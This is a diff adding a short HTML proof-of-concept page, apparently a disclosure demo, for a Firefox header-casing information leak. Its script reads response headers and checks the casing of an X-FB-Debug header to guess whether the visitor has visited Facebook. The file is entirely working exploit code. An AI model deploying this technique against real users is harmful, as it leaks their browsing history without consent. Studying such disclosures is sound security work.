@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <title>Firefox headers casing information disclosure</title>
+  <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
+</head><body>
+    <h1>Firefox headers interning test</h1>
+    <h3>(information disclosure via getAllResponseHeaders)</h3><br>
+    <br>
+    <h3>
+      <div id="fb">I don't know if you've visited Facebook or not.</div>
+    </h3>
+    <script>
+    $(function(){
+        $.ajax({
+            url: 'set_headers.txt',
+            cache: false,
+            success: function(_, _, xhr){
+                var respheaders = xhr.getAllResponseHeaders();
+                console.log(respheaders);
+                var headers = respheaders.split('\n');
+                for(var i=0; i<headers.length; i++) {
+                    var t = headers[i].split(':');
+                    var key = t[0], value = t[1];
+                    if (key.toLowerCase() === 'x-fb-debug') {
+                        if (key === 'X-Fb-DeBuG') {
+                            $("#fb").text('You didn\'t visit Facebook! I can see my weird casing in X-Fb-DeBuG header!');
+                        }
+                        if (key === 'X-FB-Debug') {
+                            $("#fb").text('You did visit Facebook! I can see normal casing in X-FB-Debug header!');
+                        }
+                    };
+                };
+            }
+        });
+    });
+    </script>
+</body></html>
